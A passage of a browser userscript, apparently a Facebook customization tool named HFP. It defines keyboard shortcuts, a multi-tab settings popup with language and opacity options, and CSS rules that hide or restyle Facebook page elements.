			if (document.getElementById('fbfPopupContainer')) { document.getElementById('fbfPopupContainer').style.display = 'none'; }
			if (document.getElementById('fbfShadow')) { document.getElementById('fbfShadow').style.display = 'none'; }
			if (prefs['PhotoPopup'] || prefs['ProfilePicPopup']) { document.getElementById('ff-popup-pic-div').style.display='none'; }
		}
		else if (e.keyCode==16 || e.keyCode==17 || e.keyCode==18) {}
		else if (e.keyCode==191) { if (e.shiftKey) { showDebugInfo(); } } // ?
		else if (e.shiftKey) {
			switch(e.keyCode) {
				case 37: clickLink('First'); break; // Left Arrow
				case 39: clickLink('Last'); break; // Right Arrow
				case 65: gotoPage('/?sk=media'); break; // A
				case 66: click($("//*[@id='fbDockChatBuddylistNub']/a",null,true)); break; // B
				case 67: if (isHomePage() || !(page=='' || page.match(/^index.php/) || page.match(/^login.php/) || page.match(/^logout.php/))) { showConfig(); } break; // C
				case 68: gotoPage('/?sk=bd'); break; // D
				case 69: gotoPage('/?sk=events'); break; // E
				case 70: gotoPage('/friends/?filter=afp'); break; // F
				case 72: gotoPage('/home.php'); break; // H
				case 73: gotoPage('/?sk=messages'); break; // I
				case 75: click($('#ff-add-bookmark')); break; // K
				case 76: click($('#navAccountLink')); $('//form[@id="logout_form"]//input[@type="submit"]', null, true).focus(); break; // L
				case 78: gotoPage('/notifications.php'); break; // N
				case 80: window.location.href = 'http://www.facebook.com/' + (id.match(/^\d+$/) ? 'profile.php?id='+id+'&ref=profile' : id); break // P
				case 82: gotoPage('/reqs.php'); break; // R
				case 83: e.stopPropagation(); e.preventDefault(); document.getElementById('q').focus(); break; // S
				case 84: if (window.getSelection()!='') { googleTranslate(window.getSelection()); } break; // T
				case 86: gotoPage('/?sk=video'); break; // V
			}
		}
		else {
			if (page.indexOf('photo.php')==0) {
				switch(e.keyCode) {
					case 82: rotate($('//img[@id="fbPhotoImage"]|//div[@id="fbPhotoSnowbox"]//img[@class="spotlight"]', null, true)); break; // r
				}
			} else if (page.indexOf('/photos/')!=-1) {
				switch(e.keyCode) {
					case 65: // a
					case 82: window.location.href = 'http://www.facebook.com/photos/?ref=sb&view=recent'; break; // r
					case 77: // m
					case 85: window.location.href = 'http://www.facebook.com/photos/?ref=sb&view=mobile'; break; // u
					case 84: // t
					case 70: window.location.href = 'http://www.facebook.com/photos/?ref=sb&view=tagged'; break; // f
					case 67: clickLink('Photo Comments'); break; // c
					case 79: clickLink('Photos of Me'); break; // o
					case 80: clickLink('My Photos'); break; // p
				}
			}
			else if (isHomePage()) {
				switch(e.keyCode) {
					case 65: gotoPage('/home.php?filter=pp'); break; // a
					case 70: gotoPage('/home.php?filter=nf'); break; // f
					case 71: gotoPage('/home.php?filter=app_2361831622'); break; // g
					case 76: gotoPage('/home.php?filter=app_2309869772'); break; // l
					case 78: gotoPage('/home.php?filter=h'); break; // n
					case 80: gotoPage('/home.php?filter=app_2305272732'); break; // p
					case 83: gotoPage('/home.php?filter=app_2915120374'); break; // s
					case 84: gotoPage('/home.php?filter=app_2347471856'); break; // t
					case 85: gotoPage('/home.php?filter=app_2915120374'); break; // u
					case 86: gotoPage('/home.php?filter=app_2392950137'); break; // v
				}
			}
			else {
				switch(e.keyCode) {
					case 66: clickLink($l('ShowBigPictures')); break; // b
					case 67: if (!clickLink('View Comments')) { if (!clickLink('Photo Comments')) { clickLink('Comments on Photos'); } } break; // c
					case 73: gotoPageX('//a[contains(@href,"v=info")][not(contains(@href,"edit"))]'); break; // i
					case 80: gotoPageX("//a[contains(@href,'v=photos')]"); break; // p
					case 87: gotoPageX("//a[contains(@href,'v=wall')]");  break; // w
					case 88: gotoPageX("//a[contains(@href,'v=box')]");  break; // x
				}
			}
			if (page.match(/^profile\.php\?.*photos/) && e.keyCode==77) { clickLink('and Me ('); }
			switch(e.keyCode) {
				case 37: if (clickLink('Prev')==-1) { clickLink('prev'); }  break; // Left Arrow
				case 39: if (clickLink('Next')==-1) { clickLink('next'); } break; // Right Arrow
				case 75: gotoPageX('//a[contains(@href,"album.php")][not(contains(@href,"page="))]'); break; // k
				case 65: click(document.getElementById('FBFLoadAllPhotos')); break; // a
			}
		}
	}, false);
}


//
// Allow script configuration
//
registerMenuCommand($l('ConfigureFacebookFixer'), showConfig);
if (menu = $('//li[@id="navAccount"]/ul',null,true)) {
	var configLink = document.createElement('li');
	configLink.innerHTML = '<a id="fbfConfigMenuLink" href="#" onclick="return false;">' + $l('ConfigureFacebookFixer') + '</a>';
	menu.insertBefore(configLink, menu.childNodes[2]);
	on('click', '#fbfConfigMenuLink', showConfig);
}
function showConfig() {
	var opacitySelect = '';
	for (i=100; i>=0; i-=10) { opacitySelect=opacitySelect+'<option value="' + (i==100?'1.0':'0.'+(i/10)) + '">' + (100-i) + '%</option>'; }
	function makeOpacitySelector(id1, id2) { return '<tr><td><span class="fbfLabel">' + $l('Conf'+id1) + '</span></td><td><select id="fbfConf' + id1 + '">' + opacitySelect + '<option value="-1">' + $l('Remove') + '</option></select> &nbsp; &nbsp;<span class="fbfLabel">' + $l('Conf'+id2) + '</span> &nbsp;<select id="fbfConf' + id2 + '">' + opacitySelect + '</select></td></tr>'; }
	function makeCheckBoxes(ids, prefix) {
		if (!prefix) { prefix = ''; }
		ids = ids.split(',');
		for (var i=0, buf=''; i<ids.length; i++) { buf = buf + prefix + '<input type="checkbox" id="fbfConf' + ids[i] + '" /><label for="fbfConf' + ids[i] + '">' + $l('Conf'+ids[i]) + '</label><br />'; }
		return buf;
	}
	function makeNumberInputs(ids) {
		ids = ids.split(',');
		for (var i=0, buf = ''; i<ids.length; i++) { buf = buf + $l('Conf'+ids[i]) + '<br /><input type="text" id="fbfConf' + ids[i] + '" value="' + prefs[ids[i]] + '" /><br />'; }
		return buf;
	}
	showPopup('<div id="FBFConfig" class="fbfPopup">'+
		'<div style="text-align:center;"><span class="fbfImportant">' + $l('ConfigureFacebookFixer') + '</span><br /><span class="fbfNote">(HFP ' + version + ' - ' + release_date + ' - ' + id + ')</span></div><br />'+
		$l('ConfigureInstructions') + '<br />'+
		'<br />'+
		'<table id="fbfConfigContainer">'+
			'<tr><td id="fbfConfigTabs">'+
					'<div id="fbfConfigTab-0" class="fbfConfigSelectedTab">' + $l('ConfSectionHomePage') + '</div>'+
					'<div id="fbfConfigTab-1">' + $l('ConfSectionFeeds') + '</div>'+
					'<div id="fbfConfigTab-2">' + $l('ConfSectionPictures') + '</div>'+
					'<div id="fbfConfigTab-3">' + $l('ConfSectionEvents') + '</div>'+
					'<div id="fbfConfigTab-4">' + $l('ConfSectionMenu') + '</div>'+
					'<div id="fbfConfigTab-5">' + $l('ConfSectionPageTitle') + '</div>'+
					'<div id="fbfConfigTab-6">' + $l('ConfSectionShortcuts') + '</div>'+
					'<div id="fbfConfigTab-7">' + $l('ConfSectionOther') + '</div>'+
					'<div id="fbfConfigTab-8">' + $l('ConfSectionImportExport') + '</div>'+
					'<div id="fbfConfigTab-9">' + $l('ConfSectionAdvanced') + '</div>'+
					'<div id="fbfConfigTab-10">' + $l('ConfSectionAbout') + '</div>'+
			'</td><td id="fbfConfigControls">'+
				'<div id="fbfConfigControl-0" class="fbfConfigSelectedControl">'+
					makeCheckBoxes('HomeStretch,HomeStretchMiddleColumn,HomeMostRecent,HomeLeftAlign,HomeLeftColumnFixed,HomeLeftColumn')+
					makeCheckBoxes('HomeProfile,HomeNavigation,HomeChat', ' &nbsp; &nbsp; ') +
					makeCheckBoxes('HomeChatNames', ' &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;') +
					makeCheckBoxes('HomeRightColumn') +
					makeCheckBoxes('HomeEvents,HomeRecommendations,HomeRequests,HomePokes,HomeFindFriends', ' &nbsp; &nbsp; ') +
				'</div>'+
				'<div id="fbfConfigControl-1">'+
					makeCheckBoxes('HideApplicationStories,HideAskFriendStories,HideEventStories,HideFriendStories,HideGroupStories,HideLikeStories,HideLinkStories,HideNoteStories,HidePhotoStories,HidePlaceStories,HideProfilePicStories,HideRelationshipStories,HideStatusStories,HideVideoStories,HideWallStories') +
					'<br />' + $l('ConfApplicationWhitelist') + '<br /><textarea id="fbfConfApplicationWhitelist" style="width:400px; height:150px;"></textarea>' +
				'</div>'+
				'<div id="fbfConfigControl-2">'+
					makeCheckBoxes('ProfilePicPopup,PhotoPopup,ExternalPopup,DelayPopupPics,PopupAutoClose,PopupSmartAutoClose,PopupWhileTagging,BigAlbumPictures')+
					makeCheckBoxes('BigAlbumPicturesBorder', '&nbsp; &nbsp; ')+
					makeCheckBoxes('AutoBigAlbumPictures,AutoLoadFullAlbum,AutoLoadTaggedPhotos,DisableTheater') +
					'<span class="fbfLabel">' + $l('ConfPopupPosition') + ': </span><input type="radio" name="fbfConfPopupPosition" id="fbfConfPopupPosition-auto" value="auto" /><label for="fbfConfPopupPosition-auto">' + $l('Automatic') + '</label> <input type="radio" name="fbfConfPopupPosition" id="fbfConfPopupPosition-left" value="left" /><label for="fbfConfPopupPosition-left">' + $l('Left') + '</label> <input type="radio" name="fbfConfPopupPosition" id="fbfConfPopupPosition-right" value="right" /><label for="fbfConfPopupPosition-right">' + $l('Right') + '</label><br />'+
				'</div>'+
				'<div id="fbfConfigControl-3">'+
					makeCheckBoxes('Age,Sign,iCalendar,GoogleCalendar,CalendarFullName,CalendarBirthDate,GoogleApps') +
					$l('ConfGoogleAppsDomain') + ': <input id="fbfConfGoogleAppsDomain"></input><br />'+
				'</div>'+
				'<div id="fbfConfigControl-4">'+
					makeCheckBoxes('ChatHideIdle,ChatDifferentiate,Bookmarks,LogoutLink,HomeLink,FindFriendsLink,ProfileLink,TopBarFixed') +
					'<table style="margin-left:-3px;">' +
					makeOpacitySelector('TopBarOpacity', 'TopBarHoverOpacity') +
					makeOpacitySelector('BottomBarOpacity', 'BottomBarHoverOpacity') +
					'</table>' +
				'</div>'+
				'<div id="fbfConfigControl-5">'+
					makeCheckBoxes('PageTitle,HideFacebookCountInTitle,FriendRequestCountInTitle,InboxCountInTitle,NotificationCountInTitle') +
				'</div>'+
				'<div id="fbfConfigControl-6">'+
					makeCheckBoxes('Shortcuts') + '<br />' + $l('ConfShortcutList')+
				'</div>'+
				'<div id="fbfConfigControl-7">'+
					makeCheckBoxes('DownloadVideo,ProtocolLinks,ErrorPageReload,NewTabSearch,SecureLinks,AutoReadMore,HideHovercards,FacebookTimestamps,FBFTimestamps,FBFTimestamps24,Updates') +
					'<table style="margin-left:-3px;">' +
					'<tr><td><span class="fbfLabel">' + $l('ConfFacebookHFPLanguage') + ':</span></td><td><select id="fbfConfFacebookHFPLanguage" style="padding:0; margin-top:3px;"><option value="auto">' + $l('Automatic') + '</option><option value="cs">Čeština (Czech)</option><option value="sr_rs">Српски (Serbian - Cyrillic)</option><option value="da">Dansk (Danish)</option><option value="el">Ελληνικά (Greek)</option><option value="en">English</option><option value="es">Español (Spanish)</option><option value="fr">Français (French)</option><option value="de">Deutsch (German)</option><option value="it">Italiano (Italian)</option><option value="id">Bahasa Indonesia (Indonesian)</option><option value="mk">македонски јазик (Macedonian)</option><option value="nl">Nederlands (Dutch)</option><option value="nb">Norsk (Norwegian)</option><option value="sk">Slovenčina (Slovak)</option><option value="sr">Srpski (Serbian - Latin)</option><option value="vi">Tiếng Việt (Vietnamese)</option><option value="tr">Türkçe (Turkish)</option><option value="bg">Български (Bulgarian)</option><option value="zh_tw">中文(台灣) (Chinese - Taiwan)</option><option value="ko">한국어 (Korean)</option><option value="ja">日本語 (Japanese)</option></select></td></tr>'+
					'<tr><td><span class="fbfLabel">' + $l('ConfGoogleLanguage') + ':</span></td><td><select id="fbfConfGoogleLanguage" style="padding:0; margin-top:3px;"><option value="af">Afrikaans</option><option value="sq">Albanian</option><option value="ar">Arabic</option><option value="hy">Armenian</option><option value="az">Azerbaijani</option><option value="eu">Basque</option><option value="be">Belarusian</option><option value="bg">Bulgarian</option><option value="ca">Catalan</option><option value="zh-CN">Chinese (Simplified)</option><option value="zh-TW">Chinese (Traditional)</option><option value="hr">Croatian</option><option value="cs">Czech</option><option value="da">Danish</option><option value="nl">Dutch</option><option value="en">English</option><option value="et">Estonian</option><option value="tl">Filipino</option><option value="fi">Finnish</option><option value="fr">French</option><option value="gl">Galician</option><option value="ka">Georgian</option><option value="de">German</option><option value="el">Greek</option><option value="ht">Hatian Creole</option><option value="iw">Hebrew</option><option value="hi">Hindi</option><option value="hu">Hungarian</option><option value="is">Icelandic</option><option value="id">Indonesian</option><option value="ga">Irish</option><option value="it">Italian</option><option value="ja">Japanese</option><option value="ko">Korean</option><option value="la">Latin</option><option value="lv">Latvian</option><option value="lt">Lithuanian</option><option value="mk">Macedonian</option><option value="ms">Malay</option><option value="mt">Maltese</option><option value="no">Norwegian</option><option value="fa">Persian</option><option value="pl">Polish</option><option value="pt">Portuguese</option><option value="ro">Romanian</option><option value="ru">Russian</option><option value="sr">Serbian</option><option value="sk">Slovak</option><option value="sl">Slovenian</option><option value="es">Spanish</option><option value="sw">Swahili</option><option value="sv">Swedish</option><option value="th">Thai</option><option value="tr">Turkish</option><option value="uk">Ukrainian</option><option value="ur">Urdu</option><option value="vi">Vietnamese</option><option value="cy">Welsh</option><option value="yi">Yiddish</option></select></td></tr>'+
					'</table>' +
				'</div>'+
				'<div id="fbfConfigControl-8">'+
					(typeof JSON == 'undefined' ? $l('BrowserUnsupported') : $l('ConfExport') + '<br />' + $l('ConfImport') + '<br /><br /><textarea id="fbfPrefsJSON" style="width:425px; height:200px;" onmouseover="this.focus();this.select()">' + JSON.stringify(prefs, null, "\n") + '</textarea><br /><input type="button" id="fbfImport" value="' + $l('Import') + '" />')+
				'</div>'+
				'<div id="fbfConfigControl-9">'+
					makeNumberInputs('ProcessInterval,DelayPopupPicsTimeout')+
					makeCheckBoxes('HideEgos,PageStretch')+
					'<br /><input type="button" id="fbfAnalyzeLocalization" value="Analyze Localization" />'+
					'<br /><br />Custom Feed Modification (<a href="http://www.ruifujiwara.co.cc" target="_blank">instructions</a>):<br /><textarea id="fbfConfCustomFeedModification" style="width:400px; height:150px;"></textarea><br /><input type="button" value="Save Custom Feed Modification" id="SaveCustomFeedModification" />'+
					'<br /><br />Custom CSS (<a href="http://www.ruifujiwara.co.cc" target="_blank">instructions</a>):<br /><textarea id="fbfConfCustomCSS" style="width:400px; height:150px;"></textarea><br /><input type="button" value="Save Custom CSS" id="SaveCustomCSS" />'+
				'</div>'+
				'<div id="fbfConfigControl-10">'+
					'<span xmlns:dc="http://purl.org/dc/elements/1.1/" property="dc:title"><a href="http://www.ruifujiwara.co.cc" target="_blank">HFP</a></span> by <span xmlns:cc="http://creativecommons.org/ns#" property="cc:attributionName">Rui Fujiwara</span> is licensed under a <a rel="license" href="http://ruifujiwara.co.cc">Creative Commons Attribution-Share Alike 3.0 Unported License</a>.<br /><br />Facebook is a registered trademark of Facebook, Inc.<br />HFP is not related to or endorsed by Facebook, Inc. in any way.<br /><br /><a rel="license" href="http://ruifujiwara.co.cc/"><img alt="Creative Commons License" style="border-width:0;" src="http://i.creativecommons.org/l/by-sa/3.0/88x31.png" /></a><br /><br /><b>' + $l('Translators') + ':</b><ul><li>Alice Tan - Chinese (Taiwan)</li><li>Yerslav - Czech</li><li>Scneider - German</li><li>Thomas Neer - Bulgarian</li><li>Terry Scwatt - Greek</li><li>Issa Dexter - Norwegian</li><li>Mario Fonta - Spanish</li><li>Ismail Ali- Macedonian</li><li>Hakan Naheer - Turkish</li><li>Monteli Aquiro - Italian</li><li>Atersiv - Serbian (Cyrillic and Latin)</li><li>Monteli Aquiro - Italian</li><li>Marissa Helena - Dutch</li><li>Georgio - Danish</li><li>Dedicate to Aya Sano and Yuko Shimada - Japanese</li><li>MInamika - Spanish</li><li>Zlatan Sargavoka - Slovak</li><li><li>Eclaire Lumiere - French</li><li>Ryan Endika Chandra- Indonesian</li><li>Thatn Do Sin - Vietnamese</li><li>Moryong - Korean</li></ul>'+
				'</div>'+
			'</td></tr>'+
		'</table>'+
		'<br /><hr /><div style="float:left; padding-top:8px;"><a href="http://www.ruifujiwara.co.cc">' + $l('UpdateHomepage') + '</a></div><div style="text-align:right;"><input type="button" value="' + $l('Refresh') + '" onclick="location.reload();" /> <input type="button" id="fbfCloseConfig" value="' + $l('Close') + '" /></div>'+
		'</div>', true
	);
	// Add the listener for the close button - if nothing else we should be able to close the popup
	onClick('fbfCloseConfig', function() { hidePopup(); });

	try {

		// Update checkbox/boolean fields to match current settings and listen for changes
		for (var i=0; i<booleanOptions.length; i++) {
			if (prefs[booleanOptions[i]]) { $('#fbfConf'+booleanOptions[i]).checked='checked'; }
			on('click', '#fbfConf'+booleanOptions[i], function(e) {
				setValue(e.target.id.replace('fbfConf',''), e.target.checked);
				prefs[e.target.id.replace('fbfConf','')] = e.target.checked;
			});
		}
		
		// Update radio fields to match current settings
		$('#fbfConfPopupPosition-' + prefs['PopupPosition']).checked='checked';
		
		// Update select fields to match current settings
		var opacities = new Array('BottomBarOpacity','BottomBarHoverOpacity','TopBarOpacity','TopBarHoverOpacity');
		for (var i=0; i<opacities.length; i++) { $('#fbfConf'+opacities[i]).value = prefs[opacities[i]]; }
		$('#fbfConfGoogleAppsDomain').value = prefs['GoogleAppsDomain'];
		$('#fbfConfGoogleLanguage').value = prefs['GoogleLanguage'];
		$('#fbfConfFacebookHFPLanguage').value = prefs['FacebookHFPLanguage'];
		$('#fbfConfApplicationWhitelist').value = JSON.parse(prefs['ApplicationWhitelist']).sort().join(' ');
		$('#fbfConfCustomFeedModification').value = prefs['CustomFeedModification'];
		$('#fbfConfCustomCSS').value = prefs['CustomCSS'];

		// Listen for changes
		
		on('click', '#fbfConfigTabs', function(e) {
			var current = e.target;
			if (current.tagName=='DIV' && current.className != 'fbfConfigSelectedTab') {
				var previous = $('.fbfConfigSelectedTab')[0];
				previous.className='';
				$('#fbfConfigControl-' + previous.id.match(/-(\d+)/)[1]).className = '';
				current.className = 'fbfConfigSelectedTab';
				$('#fbfConfigControl-' + current.id.match(/-(\d+)/)[1]).className = 'fbfConfigSelectedControl';
			}
		});
		
		var positions = new Array('auto','left','right');
		for (var i=0; i<positions.length; i++) {
			on('click', '#fbfConfPopupPosition-'+positions[i], function(e) {
				setValue('PopupPosition', e.target.id.replace('fbfConfPopupPosition-',''));
				e.target.blur();
			});
		}
		
		on('keyup', '#fbfConfGoogleAppsDomain', function(e) {
				setValue('GoogleAppsDomain', e.target.value);
				prefs['GoogleAppsDomain'] = e.target.value;
		});
		
		on(Array('blur','keyup'), '#fbfConfApplicationWhitelist', function(e) {
				e.target.value = e.target.value.replace(/^\s+/g, '').replace(/\s*[^\d\s]/g, ' ').replace(/(\s)\s+(\S)/, '$1$2');
				var awl = JSON.stringify(e.target.value.replace(/^\s+|\s+$/g, '').split(/\s+/).sort());
				if (awl == '[""]') { awl = '[]'; }
				setValue('ApplicationWhitelist', awl);
				prefs['ApplicationWhitelist'] = awl;
		});
		
	
	
		on('click', '#SaveCustomFeedModification', function() { setValue('CustomFeedModification', $('#fbfConfCustomFeedModification').value); });
		
		on('click', '#SaveCustomCSS', function() { setValue('CustomCSS', $('#fbfConfCustomCSS').value); });
		
		on('click', '#fbfAnalyzeLocalization', function() {
			var analysis = [];
			for (var key in lang.en) {
				var missing = !lang[language][key];
				var string = missing ? $l(key) : lang[language][key];
				if (typeof string == 'string') { string = "'" + string.toString().replace("'", "\\'").replace(/\n/g, "\\n") + "'"; }
				else {
					var buffer = [];
					for (var i=0; i<string.length; i++) { buffer.push("'" + string[i].replace("'", "\\'").replace(/\n/g, "\\n") + "'"); }
					string = "new Array(" + buffer.join(",") + ")";
				}
				analysis.push((missing ? '/**/' : '') + "		'" + key + "' : " + string);
			}
			showDialog(
				'<div style="margin-bottom:9px;">Below are the strings for the ' + $l('_language') + ' localization.' + (language=='en' ? ' You can use them for starting a new localization.' : '<br />Obsolete strings have been removed, and strings requiring translation have /**/ at the start of the line.') + '</div>'+
				'<textarea style="height:600px; width:694px; padding:2px;" onmouseover="this.focus(); this.select();" wrap="off" readonly="yes">' + analysis.join(',\n') + '</textarea>'
			);
		});
		
		var selects = new Array('BottomBarOpacity','BottomBarHoverOpacity','TopBarOpacity','TopBarHoverOpacity','FacebookHFPLanguage','GoogleLanguage');
		for (var i=0; i<selects.length; i++) {
			on('change', '#fbfConf'+selects[i], function(e) {
				setValue(e.target.id.replace(/^fbfConf/,''),e.target.options[e.target.selectedIndex].value);
				e.target.blur();
			});
		}

		var numberInputs = new Array('ProcessInterval','DelayPopupPicsTimeout');
		for (var i=0; i<numberInputs.length; i++) {
			on('keyup', '#fbfConf'+numberInputs[i], function(e) {
				try {
					var val = parseInt(e.target.value);
					setValue(e.target.id.replace(/^fbfConf/,''), val);
				} catch(x){}
			});
		}

	} catch(x) { logError('Config Popup', x); }

	window.scroll(0,0);
}

//
//

//
// Add CSS
//
var style='';

// General CSS used by script itself
style = style +
	'.fbfPopup { padding:10px; background:#f6f6f6; border:3px double #666666; -moz-border-radius:5px; -webkit-border-radius:5px; -khtml-border-radius:5px; border-radius:5px; }'+
	'.fbfPopupContainer { display:none; top:0; right:0; bottom:0; left:0; }'+
	'#ff-popup-pic-div { display:none; background:white; border:1px solid #333; position:fixed !important; top:3px !important; padding:4px; min-width:130px; z-index:99999 !important; -moz-border-radius:3px; -webkit-border-radius:3px; -khtml-border-radius:3px; border-radius:3px; }'+
	'.ff-popup-pic-div-left { left:3px !important; right:auto !important; -moz-box-shadow:5px 5px 5px rgba(0,0,0,0.6); -webkit-box-shadow:5px 5px 5px rgba(0,0,0,0.6); -khtml-box-shadow:5px 5px 5px rgba(0,0,0,0.6); box-shadow:5px 5px 5px rgba(0,0,0,0.6); }'+
	'.ff-popup-pic-div-right { right:3px !important; left:auto !important; -moz-box-shadow:-5px 5px 5px rgba(0,0,0,0.6); -webkit-box-shadow:-5px 5px 5px rgba(0,0,0,0.6); -khtml-box-shadow:-5px 5px 5px rgba(0,0,0,0.6); box-shadow:-5px 5px 5px rgba(0,0,0,0.6); }'+
	'#ff-popup-pic-div img { max-height: ' + (window.innerHeight-35) + 'px; }'+
	'#ff-popup-pic-close { display:none; position:absolute; top:4px; right:10px; color:#ff9999; cursor:pointer; font-weight:bold; font-size:14px; }'+
	'#ff-popup-pic-div:hover #ff-popup-pic-close { display:block; }'+
	'#ff-popup-pic-close:hover { color:#aa6666; }'+
	'#ff-popup-pic-image { text-align:center; }'+
	'#ff-popup-pic-image img { color:#999999; display:block; }'+
	'#FBFBigAlbumContainer { padding:0 0 40px; }'+
	'#FBFBigAlbum { padding:15px 3px; margin:10px; text-align:center; position:relative; }'+
	'#FBFBigAlbum a { padding:1px; }'+
	'.FBFBigAlbumClose { color:red; cursor:pointer; font-weight:bold; padding:0 10px; }'+
	'#FBFBigAlbumClose1 { position:absolute; top:0; right:0; }'+
	'#FBFBigAlbumClose2 { position:absolute; bottom:0; right:0; }'+
	'#FBFConfigShadow, #fbfShadow { display:none; position:fixed; top:0; left:0; right:0; bottom:0; background:black; opacity:0.8; }'+
	'#fbfUpdatePopup { max-width:450px; margin:100px auto; padding:10px; }'+
	'.fbfImportant { font-weight:bold; }'+
	'.fbfNote { color:#777777; }'+
	'.fbfRight { text-align:right; }'+
	'.ad_story .social_ad_advert { z-index:0; }'+
	'.ff-album-page td { background:#aaa; text-align:center; }'+
	'#ff-debug td { vertical-align:top; }'+
	'.HFP-highlighted-story, .HFP-highlighted-story * { font-weight:bold !important; }';

// CSS for the config screen
style = style +
	'#fbfConfigContainer { width:100%; z-index:1001; }'+
	'#FBFConfig { width:700px; padding:10px; margin:20px auto 0; }'+
	'#FBFConfig label, #FBFConfig .fbfLabel { color:#666666; font-weight:normal; } '+
	'#FBFConfig .fbfHeader { font-weight:bold; }'+
	'#fbfConfigTabs { width:200px; vertical-align:top; }'+
	'#fbfConfigTabs div { background:white; color:background:#3b5998; padding:10px 0 10px 10px; border:1px solid #cccccc; border-top-width:0; cursor:pointer; }'+
	'#fbfConfigTabs div#fbfConfigTab-0 { border-top-width:1px; }'+
	'#fbfConfigTabs div:hover { font-weight:bold; }'+
	'#fbfConfigTabs div.fbfConfigSelectedTab { background:#3b5998; color:white; font-weight:bold; }'+
	'#fbfConfigControls { background:white; border:1px solid #cccccc; vertical-align:top; }'+
	'#fbfConfigControls div { display:none; padding:5px 5px 5px 23px; }'+
	'#fbfConfigControls div.fbfConfigSelectedControl { display:block; }'+
	'#fbfConfigControls input[type=checkbox] { margin-left:-18px; margin-bottom:8px; }';

// Custom CSS
if (prefs['CustomCSS'].length>0) { style = style + prefs['CustomCSS']; }

// CSS used to hide/show/alter Facebook features
if (prefs['ChatDifferentiate'])			{ style = style + ' .fbChatBuddyList a.friend, #pagelet_friends_online .chatOnline { font-weight:bold; } .fbChatBuddyList a.idle, #pagelet_friends_online .chatIdle { font-weight:normal; font-style:italic; }'; }
if (prefs['ChatHideIdle'])				{ style = style + ' body .fbChatBuddyList a.idle { max-height:0; overflow:hidden; padding-top:0; padding-bottom:0; } #pagelet_friends_online .chatIdle { display:none; }'; }
if (prefs['HideEgos'])					{ style = style + ' .ego_column, .netego_organic, #netego_organic, #pagelet_netego, #pagelet_netego_lower, #pagelet_betabox { display:none; } #pagelet_netego_requests div.ego_column, #pagelet_netego_pokes div.ego_column { display:block; }'; }
if (prefs['HideHovercards'])			{ style = style + ' .HovercardOverlay { display:none; }'; }
if (prefs['AutoReadMore'])				{ style = style + ' .text_exposed_root .text_exposed_hide { display:none; } .text_exposed_root .text_exposed_show { display:inline; }'; }
//if (prefs['FBFTimestamps'])				{ style = style + ' abbr[data-date] { display:none; } abbr.timestamp { display:inline; }'; } // debug
if (prefs['BigAlbumPicturesBorder'])	{ style = style + ' #FBFBigAlbum a { padding:0 1px 1px 0; } #FBFBigAlbum img { display:inline-block; border:1px solid #ccc; background:#fff; min-width:20px; min-height:20px; }'; }
if (prefs['HomeLeftColumnFixed'])		{ style = style + ' .home #leftCol { position:fixed; }'; }
if (prefs['HomeStretchMiddleColumn'])	{ style = style + ' .home li.uiUnifiedStory { padding-right:0; } .home form.commentable_item > ul {width: auto !important;} .home .uiStream .hideSelector { margin-right:0; }'; }
if (prefs['HomeStretch'])				{ style = style + ' .home #globalContainer { width:auto; margin:auto 7px; } .home #fbf-page-head-container { width:auto; } .home .hasRightCol { position:relative; } .home #contentCol #contentArea { margin-right:10px; width:auto; } .home #contentCol.hasRightCol #contentArea { margin-right:275px; width:auto; } .home .hasRightCol #rightCol { position:absolute; right:0; } .home .uiStream .hideSelector { margin-right:0; }'; }
else if (prefs['HomeLeftAlign'])		{ style = style + ' .home #globalContainer { margin:0 0 0 5px; ! important; }'; }
if (prefs['PageStretch'])				{ style = style + ' .fbx li.uiUnifiedStory { padding-right:0; } .fbx form.commentable_item > ul {width: auto !important;} .fbx .uiStream .hideSelector { margin-right:0; } .fbx #globalContainer { width:auto; margin:auto 7px; } .fbx #fbf-page-head-container { width:auto; } .fbx .hasRightCol { position:relative; } .fbx #contentCol #contentArea { margin-right:10px; width:auto; min-width:759px; } .fbx #contentCol.hasRightCol #contentArea { margin-right:275px; width:auto; } .fbx .hasRightCol #rightCol { position:absolute; right:0; } .fbx .uiStream .hideSelector { margin-right:0; }'; }
if (!prefs['FindFriendsLink'])			{ style = style + ' #pageNav li a[href*="find-friends"] { display:none; }'; }
if (!prefs['HomeLink'])					{ style = style + ' #pageNav li a[href*="ref=home"] { display:none; }'; }
if (!prefs['ProfileLink'])				{ style = style + ' #pageNav li a[accesskey="2"] { display:none; }'; }
if (!prefs['TopBarFixed']) 				{ style = style + ' #blueBar { position:static !important; }'; }
if (!prefs['FacebookTimestamps'])		{ style = style + ' abbr.timestamp { display:none; }'; }
if (!prefs['HomeProfile'])				{ style = style + ' #pagelet_welcome_box { display:none; }'; }
if (!prefs['HomeNavigation'])			{ style = style + ' #pagelet_navigation { display:none; }'; }
if (!prefs['HomeChat'])					{ style = style + ' #pagelet_friends_online { display:none; }'; }
if (!prefs['HomePokes'])				{ style = style + ' #pagelet_netego_pokes { display:none; }'; }
if (!prefs['HomeRecommendations'])		{ style = style + ' #pagelet_netego, #pagelet_netego_lower { display:none; }'; }
if (!prefs['HomeFindFriends'])			{ style = style + ' #pagelet_netego_lower { display:none; }'; }
if (!prefs['HomeEvents'])				{ style = style + ' #pagelet_eventbox { display:none; }'; }
if (!prefs['HomeRequests'])				{ style = style + ' #pagelet_netego_requests { display:none; }'; }
if (!prefs['HomeBeta'])					{ style = style + ' #pagelet_betabox { display:none; }'; }
if (!prefs['HomeLeftColumn'])			{ style = style + ' .home #mainContainer #leftCol { display:none; } .home #mainContainer #contentCol { margin-left:5px; }'; }
if (!prefs['HomeRightColumn'])			{ style = style + ' .home #mainContainer #rightCol { display:none; }'; $('#contentCol').className=$('#contentCol').className.replace(/ hasRightCol/,''); }
if (prefs['HomeChatNames'])				{ style = style+'  .fbx #pagelet_friends_online .uiListHorizontalItem { float:none; } .fbx #pagelet_friends_online .uiTooltip .uiTooltipWrap { background:inherit; display:inline; position:relative; visibility:visible; } .fbx #pagelet_friends_online .uiTooltipText { background-position:left center; background-color:inherit; color:inherit !important; border-right:none; display:inline-block; line-height:18px; padding:0 0 0 10px; margin-left:3px; width:130px; overflow:hidden; } .fbx #pagelet_friends_online .uiProfilePhotoMedium { height:22px; width:22px; } .fbx #pagelet_friends_online .chatOverlay { background-image:none !important; }'; }

if (prefs['TopBarOpacity']!='1.0' || prefs['TopBarHoverOpacity']!='1.0') {
	if (prefs['TopBarOpacity'] < 0) { style = style + ' #blueBarHolder { display:none; } '; }
	else { style = style + ' #blueBar { opacity:' + prefs['TopBarOpacity'] + '; } #blueBar:hover { opacity:' + prefs['TopBarHoverOpacity'] + '; }'; }
}

// Apply CSS Code
